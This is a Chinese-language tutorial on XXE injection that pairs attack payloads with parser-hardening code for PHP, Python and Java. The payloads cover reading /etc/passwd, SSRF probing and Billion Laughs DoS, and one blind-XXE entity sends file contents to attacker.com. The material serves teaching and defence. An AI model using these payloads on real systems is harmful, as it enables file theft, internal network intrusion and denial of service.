# XXE — XML 外部实体注入 (XML External Entity)

## 原理

XXE 攻击发生在应用程序解析 XML 输入时，没有禁用外部实体加载。攻击者可以利用 XML 实体功能读取服务器文件、发起 SSRF 攻击或执行拒绝服务攻击。

根本原因：**XML 解析器配置不安全，允许加载外部实体**。

## 什么是 XML 实体？

XML 实体就像变量，可以定义并在 XML 中引用：

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<root>
  <data>&xxe;</data>
</root>
```

`&xxe;` 会被替换为 `/etc/passwd` 的内容。

## 攻击类型

### 1. 文件读取

```xml
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
```

### 2. SSRF（内网探测）

```xml
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "http://192.168.1.1:80">
]>
```

### 3. 盲注（Blind XXE）

当文件内容不直接返回时，通过带外（OOB）方式窃取：

```xml
<!DOCTYPE foo [
  <!ENTITY % xxe SYSTEM "file:///etc/passwd">
  <!ENTITY % callhome SYSTEM "http://attacker.com/?data=%xxe;">
  %callhome;
]>
```

### 4. DoS（Billion Laughs Attack）

```xml
<!DOCTYPE lolz [
  <!ENTITY lol "lol">
  <!ENTITY lol2 "&lol;&lol;&lol;&lol;">
  <!ENTITY lol3 "&lol2;&lol2;&lol2;">
  ...
]>
<root>&lol3;</root>
```

——XML 展开后变成数 GB 数据，耗尽服务器内存。

## 检测

如果应用接收 XML 输入（如 SOAP API、RSS 订阅、DOCX 上传），测试：

```xml
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY test "Hello">
]>
<root>&test;</root>
```

如果响应中返回 "Hello"，说明实体被解析，可能存在 XXE。

## 防御

| 防御措施 | 说明 | 代码示例（PHP） |
|----------|------|----------------|
| 禁用外部实体 | 禁用 DOCTYPE 或外部实体加载 | `libxml_disable_entity_loader(true)` |
| 使用 JSON 替代 XML | JSON 没有实体机制 | — |
| 输入过滤 | 禁止 XML 中出现 `<!DOCTYPE>` 和 `<!ENTITY>` | — |
| 升级 XML 库 | 较新版本的库默认更安全 | — |

### Python 安全配置

```python
from lxml import etree

# 安全：禁止外部实体
parser = etree.XMLParser(resolve_entities=False, no_network=True)
tree = etree.parse(xml_input, parser)
```

### Java 安全配置

```java
DocumentBuilderFactory dbf = DocumentBuilderFactory.newInstance();
dbf.setFeature("http://apache.org/xml/features/disallow-doctype-decl", true);
dbf.setFeature("http://xml.org/sax/features/external-general-entities", false);
dbf.setFeature("http://xml.org/sax/features/external-parameter-entities", false);
```

## 真实案例

### 案例：2017 年 PayPal XXE 漏洞
- 漏洞：PayPal 的一个 API 端点解析 XML 时启用了外部实体
- 利用：攻击者可以读取服务器上的任意文件
- 奖金：漏洞赏金计划中被评为严重级别

## 在 Pikachu 靶场中的对应模块

Pikachu 提供了 XXE 漏洞练习场景，演示通过 XXE 读取文件内容。
